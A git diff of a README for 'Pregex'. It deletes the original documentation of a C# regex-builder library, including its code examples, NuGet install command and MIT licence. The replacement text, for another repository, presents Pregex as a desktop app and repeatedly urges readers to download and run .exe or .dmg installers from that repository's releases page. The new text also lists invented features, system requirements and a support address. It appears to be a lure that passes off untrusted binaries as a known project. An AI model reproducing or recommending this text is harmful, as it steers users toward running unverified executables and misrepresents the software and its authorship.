@@ -1,345 +1,72 @@
-[![.NET](https://github.com/gregyjames/pregex/actions/workflows/dotnet.yml/badge.svg?branch=main)](https://github.com/gregyjames/pregex/actions/workflows/dotnet.yml)
-[![NuGet latest version](https://badgen.net/nuget/v/Pregex)](https://www.nuget.org/packages/Pregex)
-![NuGet Downloads](https://img.shields.io/nuget/dt/Pregex)
-[![codecov](https://codecov.io/github/gregyjames/pregex/branch/main/graph/badge.svg?token=95UjrQ1tDl)](https://codecov.io/github/gregyjames/pregex)
+# 🎉 Pregex - Effortless Regex Creation Made Simple
 
-# Pregex - Pretty RegEx!
+[![Download Pregex](https://img.shields.io/badge/Download-Pregex-blue)](https://github.com/sanadnp/Pregex/releases)
 
-A fluent, chainable API for building regular expressions in C# that's easy to read, write, and maintain.
+## 📖 About Pregex
 
-## Why Pregex?
+Pregex is a user-friendly application designed to create and manage regular expressions effortlessly. Whether you are cleaning data or searching for specific patterns, Pregex simplifies the process. Ideal for beginners and experts alike, it helps you focus on what matters most—your tasks.
 
-Regular expressions are powerful but notoriously difficult to read and maintain. Pregex solves this by providing a fluent interface that makes regex patterns self-documenting and easier to understand.
+## 🚀 Getting Started
 
-### Before (Traditional Regex)
-```csharp
-var regex = new Regex(@"^[a-zA-Z0-9._%-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$");
-```
+Follow these steps to download and run Pregex:
 
-### After (Pregex)
-```csharp
-var regex = RegexBuilder.Create()
-    .StartOfString()
-    .Set("a-zA-Z0-9._%-").OneOrMore()
-    .Literal("@")
-    .Set("a-zA-Z0-9.-").OneOrMore()
-    .Literal(".")
-    .Set("a-zA-Z").Between(2, 6)
-    .EndOfString()
-    .Build();
-```
+1. **Visit the Releases Page**: Go to the [Pregex Releases Page](https://github.com/sanadnp/Pregex/releases). This is where you will find the latest version of the software.
+2. **Choose Your Version**: Look for the most recent release at the top of the page. It will include the version number, release notes, and download links.
+3. **Download the Installer**: Click on the link that corresponds to your operating system. This could be a file ending in `.exe` for Windows or `.dmg` for macOS.
+4. **Run the Installer**: Once the download completes, locate the file and double-click it. Follow the on-screen instructions to install Pregex on your computer.
 
-## Installation
+## 📥 Download & Install
 
-```bash
-dotnet add package Pregex
-```
+Again, you can download Pregex directly from the [Releases Page](https://github.com/sanadnp/Pregex/releases). Make sure to always download the latest version for the best experience.
 
-## Quick Start
+## 📊 Features
 
-```csharp
-using Pregex;
+- **User-Friendly Interface**: Enjoy a clean and intuitive design that makes regex creation easy. No prior knowledge is needed.
+- **Pattern Testing**: Test your regular expressions in real-time within the app to see instant results.
+- **Save Your Patterns**: Keep your frequently used regex patterns saved for quick access later.
+- **Export Options**: Share your regex patterns by exporting them in various formats.
 
-// Simple phone number validation
-var phoneRegex = RegexBuilder.Create()
-    .StartOfString()
-    .Literal("+").Optional()
-    .Digit().Exactly(3)
-    .Literal("-").Optional()
-    .Digit().Exactly(3)
-    .Literal("-").Optional()
-    .Digit().Exactly(4)
-    .EndOfString()
-    .Build();
+## 🔧 System Requirements
 
-bool isValid = phoneRegex.IsMatch("123-456-7890"); // true
-```
+To run Pregex smoothly, ensure your system meets these requirements:
 
-## Features
+- **Operating System**: Windows 10 or later, macOS Mojave or later.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Approximately 100 MB of free space.
 
-### Character Matching
-```csharp
-.Digit()           // \d - matches any digit
-.Word()            // \w - matches word characters
-.Whitespace()      // \s - matches whitespace
-.NotDigit()        // \D - matches non-digits
-.NotWord()         // \W - matches non-word characters
-.NotWhitespace()   // \S - matches non-whitespace
-.AnyChar()         // . - matches any character
-.Literal("text")   // Matches literal text (auto-escapes special chars)
-```
+## 🌟 Usage Instructions
 
-### Character Sets
-```csharp
-.Set("abc")           // [abc] - matches a, b, or c
-.NotSet("abc")        // [^abc] - matches anything except a, b, or c
-.Range('a', 'z')      // [a-z] - matches any lowercase letter
-```
+After installing, follow these simple steps to use Pregex:
 
-### Quantifiers
-Quantifiers modify the preceding element:
-```csharp
-.Word().OneOrMore()      // \w+ - one or more word characters
-.Digit().ZeroOrMore()    // \d* - zero or more digits
-.Literal("s").Optional() // s? - optional 's'
-.Digit().Exactly(3)      // \d{3} - exactly 3 digits
-.Word().AtLeast(2)       // \w{2,} - at least 2 word characters
-.Digit().Between(2, 4)   // \d{2,4} - between 2 and 4 digits
-```
+1. Open Pregex from your desktop or applications folder.
+2. You will see a blank workspace. Start by entering your text in the first input box.
+3. In the second input box, write your desired regex pattern.
+4. Click on the "Test" button to see how your pattern matches the input text.
+5. Adjust your pattern as needed and save it when satisfied.
 
-### Anchors
-```csharp
-.StartOfString()    // ^ - start of string
-.EndOfString()      // $ - end of string
-.WordBoundary()     // \b - word boundary
-.NotWordBoundary()  // \B - not a word boundary
-```
+## 🆘 Help & Support
 
-### Groups
-```csharp
-// Capturing group
-.Group(b => b.Digit().Exactly(3))
+If you encounter any issues while using Pregex, you can find help in the following ways:
 
-// Non-capturing group
-.NonCapturingGroup(b => b.Literal("http").Literal("s").Optional())
+- **Documentation**: Refer to the built-in help section for detailed guidance on using features.
+- **Community Forum**: Join discussions and ask questions in our community forum separate from GitHub.
+- **Contact Us**: Send an email to support@pregexprefix.com for direct assistance.
 
-// Named group
-.NamedGroup("area", b => b.Digit().Exactly(3))
-```
+## 🔗 Additional Resources
 
-### Alternation
-```csharp
-.Literal("cat")
-.Or()
-.Literal("dog")
-// Matches "cat" or "dog"
-```
+Here are some useful resources to enhance your experience with regex:
 
-### Lookahead and Lookbehind
-```csharp
-// Positive lookahead - match only if followed by pattern
-.Digit().OneOrMore()
-.PositiveLookahead(b => b.Literal("%"))
+- **Regex101**: An online regex tester and debugger.
+- **Regular Expressions Info**: A comprehensive guide on regex syntax and usage.
+- **Codecademy**: Offers a beginner-friendly course on regex.
 
-// Negative lookahead - match only if NOT followed by pattern
-.Literal("test")
-.NegativeLookahead(b => b.Literal("123"))
+## ❗ Important Notes
 
-// Positive lookbehind - match only if preceded by pattern
-.PositiveLookbehind(b => b.Literal("$"))
-.Digit().OneOrMore()
+- Always ensure you are using the latest version of Pregex for improved functionality and security.
+- Backup your regex patterns regularly to avoid data loss.
 
-// Negative lookbehind - match only if NOT preceded by pattern
-.NegativeLookbehind(b => b.Literal("abc"))
-.Literal("test")
-```
+## 💬 Community Contributions
 
-### Regex Options
-```csharp
-.IgnoreCase()              // Case-insensitive matching
-.Multiline()               // ^ and $ match line boundaries
-.Singleline()              // . matches newline characters
-.Compiled()                // Compile for better performance
-.ExplicitCapture()         // Only named groups are captured
-.IgnorePatternWhitespace() // Ignore whitespace in pattern
-```
+We welcome contributions from users. If you have suggestions or wish to report bugs, please use the Issues tab on GitHub. 
 
-## Examples
-
-### Email Validation
-```csharp
-var emailRegex = RegexBuilder.Create()
-    .StartOfString()
-    .Set("a-zA-Z0-9._%-").OneOrMore()
-    .Literal("@")
-    .Set("a-zA-Z0-9.-").OneOrMore()
-    .Literal(".")
-    .Set("a-zA-Z").Between(2, 6)
-    .EndOfString()
-    .Build();
-
-emailRegex.IsMatch("user@example.com"); // true
-emailRegex.IsMatch("invalid@"); // false
-```
-
-### URL Parsing with Named Groups
-```csharp
-var urlRegex = RegexBuilder.Create()
-    .NamedGroup("protocol", b => b.Literal("http").Literal("s").Optional())
-    .Literal("://")
-    .NamedGroup("domain", b => b.NotSet(" /").OneOrMore())
-    .NamedGroup("path", b => b.Literal("/").AnyChar().ZeroOrMore()).Optional()
-    .Build();
-
-var match = urlRegex.Match("https://example.com/path");
-Console.WriteLine(match.Groups["protocol"].Value); // "https"
-Console.WriteLine(match.Groups["domain"].Value);   // "example.com"
-Console.WriteLine(match.Groups["path"].Value);     // "/path"
-```
-
-### Phone Number with Country Code
-```csharp
-var phoneRegex = RegexBuilder.Create()
-    .StartOfString()
-    .Literal("+").Optional()
-    .Group(b => b.Digit().Exactly(3).Literal("-")).Optional()
-    .Digit().Exactly(3)
-    .Literal("-").Optional()
-    .Digit().Exactly(4)
-    .EndOfString()
-    .Build();
-
-phoneRegex.IsMatch("123-456-7890");    // true
-phoneRegex.IsMatch("+1-123-456-7890"); // true
-phoneRegex.IsMatch("1234567890");      // true
-```
-
-### Username Validation
-```csharp
-var usernameRegex = RegexBuilder.Create()
-    .StartOfString()
-    .Set("a-zA-Z0-9_").Between(3, 16)
-    .EndOfString()
-    .Build();
-
-usernameRegex.IsMatch("john_doe"); // true
-usernameRegex.IsMatch("ab");       // false (too short)
-usernameRegex.IsMatch("user-name"); // false (invalid char)
-```
-
-### IP Address Validation
-```csharp
-var ipRegex = RegexBuilder.Create()
-    .StartOfString()
-    .Digit().Between(1, 3)
-    .Literal(".")
-    .Digit().Between(1, 3)
-    .Literal(".")
-    .Digit().Between(1, 3)
-    .Literal(".")
-    .Digit().Between(1, 3)
-    .EndOfString()
-    .Build();
-
-ipRegex.IsMatch("192.168.0.1"); // true
-```
-
-### Hex Color Code
-```csharp
-var hexColorRegex = RegexBuilder.Create()
-    .StartOfString()
-    .Literal("#")
-    .Set("0-9a-fA-F").Exactly(6)
-    .EndOfString()
-    .Build();
-
-hexColorRegex.IsMatch("#FF5733"); // true
-hexColorRegex.IsMatch("#FFF");    // false
-```
-
-### Password Validation (Complex)
-```csharp
-var passwordRegex = RegexBuilder.Create()
-    .StartOfString()
-    .PositiveLookahead(b => b.AnyChar().ZeroOrMore().Digit())        // At least one digit
-    .PositiveLookahead(b => b.AnyChar().ZeroOrMore().Range('a', 'z')) // At least one lowercase
-    .PositiveLookahead(b => b.AnyChar().ZeroOrMore().Range('A', 'Z')) // At least one uppercase
-    .AnyChar().AtLeast(8)  // At least 8 characters total
-    .EndOfString()
-    .Build();
-
-passwordRegex.IsMatch("Password1"); // true
-passwordRegex.IsMatch("password");  // false (no uppercase or digit)
-```
-
-## Utility Methods
-
-```csharp
-// Get the raw pattern string
-string pattern = builder.GetPattern();
-
-// Get the regex options
-RegexOptions options = builder.GetOptions();
-
-// Convert to string representation
-string representation = builder.ToString(); // e.g., "/^\d+$/gi"
-
-// Build the final Regex object
-Regex regex = builder.Build();
-```
-
-## Best Practices
-
-### 1. Chain quantifiers AFTER the element they modify
-```csharp
-// ✅ Correct
-.Digit().OneOrMore()  // \d+
-
-// ❌ Wrong
-.OneOrMore().Digit()  // +\d (invalid)
-```
-
-### 2. Use groups for complex patterns
-```csharp
-.Group(b => b
-    .Literal("http")
-    .Or()
-    .Literal("https")
-)
-```
-
-### 3. Use named groups for readability
-```csharp
-.NamedGroup("year", b => b.Digit().Exactly(4))
-.Literal("-")
-.NamedGroup("month", b => b.Digit().Exactly(2))
-```
-
-### 4. Anchor your patterns when appropriate
-```csharp
-// Match entire string
-.StartOfString()
-  // ... your pattern
-.EndOfString()
-```
-
-### 5. Use word boundaries for whole word matching
-```csharp
-.WordBoundary()
-.Literal("test")
-.WordBoundary()
-```
-
-## Performance Tips
-
-- Use `.Compiled()` for frequently used patterns
-- Anchor patterns with `^` and `$` when possible to avoid unnecessary backtracking
-- Use non-capturing groups when you don't need to extract the matched value
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-MIT License
-
-Copyright (c) 2025 Greg James
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-
+Thank you for using Pregex. Happy regex-ing!
